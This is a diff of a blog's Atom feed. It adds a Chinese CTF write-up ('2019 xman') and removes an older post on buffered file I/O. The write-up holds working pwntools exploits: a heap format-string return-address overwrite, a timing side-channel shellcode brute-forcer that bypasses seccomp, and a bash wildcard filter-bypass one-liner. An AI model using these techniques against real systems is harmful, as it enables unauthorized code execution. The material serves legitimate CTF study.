@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://nocbtm.github.io/"/>
-  <updated>2019-12-26T12:34:50.552Z</updated>
+  <updated>2020-02-01T08:07:14.851Z</updated>
   <id>https://nocbtm.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>2019 xman writeup</title>
+    <link href="https://nocbtm.github.io/2020/01/20/2019-xman-writeup/"/>
+    <id>https://nocbtm.github.io/2020/01/20/2019-xman-writeup/</id>
+    <published>2020-01-20T08:05:00.000Z</published>
+    <updated>2020-02-01T08:07:14.851Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="format"><a href="#format" class="headerlink" title="format"></a>format</h2><p>32位格式化字符串漏洞,只开了NX保护,有多次漏洞利用机会，并且有system(“/bin/sh”),题目难点在于是堆上的格式化字符串漏洞，不能用常规的任意地址写手法</p><p><img alt="Alt text" data-src="./1580540236536.png" class="lozad"></p><h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>寻找如下图合适的跳板，第一次修改跳板为函数返回地址所在的栈地址，第二次修改函数返回地址为后门的地址。<br><img alt="Alt text" data-src="./1580541684651.png" class="lozad"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>成功几率16分之一</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.log_level=<span class="string">'debug'</span> </span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">5000</span>): </span><br><span class="line"><span class="comment">#with remote("node3.buuoj.cn",26370) as p: </span></span><br><span class="line"><span class="keyword">with</span> process(<span class="string">"./chall"</span>) <span class="keyword">as</span> p: </span><br><span class="line">p.recvuntil(<span class="string">"...\n"</span>) </span><br><span class="line">p.recvuntil(<span class="string">"...\n"</span>) </span><br><span class="line">gdb.attach(p,<span class="string">"b *0x080485F6"</span>)</span><br><span class="line">p.sendline(<span class="string">"%60c%10$hhn|%34219c%18$hnBBB"</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p.recvuntil(<span class="string">"BBB"</span>) </span><br><span class="line"><span class="comment">#p.interactive() </span></span><br><span class="line">p.sendline(<span class="string">"ls"</span>) </span><br><span class="line">data = p.recvuntil(<span class="string">"flag"</span>) </span><br><span class="line">print(data) </span><br><span class="line"><span class="keyword">if</span>(<span class="string">"flag"</span> <span class="keyword">in</span> data): </span><br><span class="line">p.interactive() </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line">print(<span class="string">'exception %s'</span> % e) </span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="nocall"><a href="#nocall" class="headerlink" title="nocall"></a>nocall</h2><p>64位程序，保护全开。题目提示输入shellcode,但这个题使用了seccomp机制，限制了execve系统调用。</p><p><img alt="Alt text" data-src="./1580542882966.png" class="lozad"><br><img alt="Alt text" data-src="./1580542965768.png" class="lozad"></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>因为flag的地址已经暴露了，程序也开启了5秒的计时器，可以通过基于时间的方法爆破flag。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">s = <span class="string">'&#125;&#123;-0123456789abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x2000000000</span>,<span class="number">0x200000000</span>+<span class="number">0x30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        payload=asm(</span><br><span class="line">            <span class="string">"""</span></span><br><span class="line"><span class="string">            mov al,[&#123;&#125;]</span></span><br><span class="line"><span class="string">            mov bl,&#123;&#125;</span></span><br><span class="line"><span class="string">        loop:</span></span><br><span class="line"><span class="string">            cmp al,bl</span></span><br><span class="line"><span class="string">            jz loop</span></span><br><span class="line"><span class="string">            ret</span></span><br><span class="line"><span class="string">            """</span>.format(str(hex(i)),str(hex(ord(j)))))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#p = remote("node3.buuoj.cn",29793)</span></span><br><span class="line">            p = process(<span class="string">"./chall"</span>)</span><br><span class="line">            p.recvuntil(<span class="string">"Your Shellcode &gt;&gt;"</span>)</span><br><span class="line">            time1=time()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> str(hex(i))+<span class="string">"-----"</span>+j</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            p.can_recv(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            time2=time()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="comment">#pause()</span></span><br><span class="line">            <span class="keyword">if</span> time2-time1&gt;<span class="number">1</span>:</span><br><span class="line">                flag+=j</span><br><span class="line">                <span class="keyword">print</span> flag</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="shellmaster"><a href="#shellmaster" class="headerlink" title="shellmaster"></a>shellmaster</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A=<span class="variable">$&#123;PATH##*:&#125;</span>;B=<span class="variable">$&#123;A%???&#125;</span>;<span class="variable">$PWD</span><span class="variable">$B</span>????</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;format&quot;&gt;&lt;a href=&quot;#format&quot; class=&quot;headerlink&quot; title=&quot;format&quot;&gt;&lt;/a&gt;format&lt;/h2&gt;&lt;p&gt;32位格式化字符串漏洞,只开了NX保护,有多次漏洞利用机会，并且有system(“/bin/sh”),题目难
+      
+    
+    </summary>
+    
+    
+      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
+    
+  </entry>
   
   <entry>
     <title>AFL漏洞挖掘</title>
@@ -494,31 +517,6 @@
     
     
       <category term="c" scheme="https://nocbtm.github.io/tags/c/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>缓冲文件系统和非缓冲文件系统</title>
-    <link href="https://nocbtm.github.io/2018/11/05/%E7%BC%93%E5%86%B2%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%92%8C%E9%9D%9E%E7%BC%93%E5%86%B2%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
-    <id>https://nocbtm.github.io/2018/11/05/缓冲文件系统和非缓冲文件系统/</id>
-    <published>2018-11-05T10:31:52.000Z</published>
-    <updated>2019-10-01T08:30:17.631Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>1983 年ANSI C 标准决定不采用非缓冲文件系统，而只采用缓冲文件系统。即用缓冲文件系统处理文本文件，也用它来处理二进制文件。也就是将缓冲文件系统扩充为可以处理二进制文件。</p><h2 id="缓冲文件系统"><a href="#缓冲文件系统" class="headerlink" title="缓冲文件系统"></a>缓冲文件系统</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>自动在内存开辟一个“缓冲区”，为程序中的每一个文件使用，当执行读文件的操作时，从磁盘文件将数据先读入内存“缓冲区”，装满后再从内存“缓冲区”依此读入接收的变量。执行写文件的操作时，先将数据写入内存“缓冲区”，待内存“缓冲区”装满后再写入文件。由此可以看出，内存“缓冲区”的大小，影响着实际操作外存的次数，内存“缓冲区”越大，则操作外存的次数就少，执行速度就快、效率高。一般来说，文件“缓冲区”的大小随机器而定。</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>用缓冲区可以一次读入一批数据，或输出一批数据，而不是执行一次输入或输出函数就去访问一次磁盘，这样做的目的是减少对磁盘的实际读写次数。</p><h3 id="代表函数"><a href="#代表函数" class="headerlink" title="代表函数"></a>代表函数</h3><p>缓冲文件系统，fopen, fclose, fread, fwrite, fgetc, fgets, fputc, fputs, freopen, fseek, ftell, rewind等</p><h2 id="非缓冲文件系统"><a href="#非缓冲文件系统" class="headerlink" title="非缓冲文件系统"></a>非缓冲文件系统</h2><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><p>非缓冲文件系统不由系统自动设置缓冲区，而由用户自己根据需要设置。在传统的unix系统下，用缓冲文件系统来处理文本文件，用非缓冲文件系统处理二进制文件。</p><h3 id="代表函数-1"><a href="#代表函数-1" class="headerlink" title="代表函数"></a>代表函数</h3><p>缓冲文件系统，open, close, read, write, gets, getchar, putc, putchar等</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;1983 年ANSI C 标准决定不采用非缓冲文件系统，而只采用缓冲文件系统。即用缓冲文件系统处理文本文件，也用它来处理二进制文件。也就是将
-      
-    
-    </summary>
-    
-      <category term="linux" scheme="https://nocbtm.github.io/categories/linux/"/>
-    
-    
-      <category term="linux" scheme="https://nocbtm.github.io/tags/linux/"/>
     
   </entry>
   
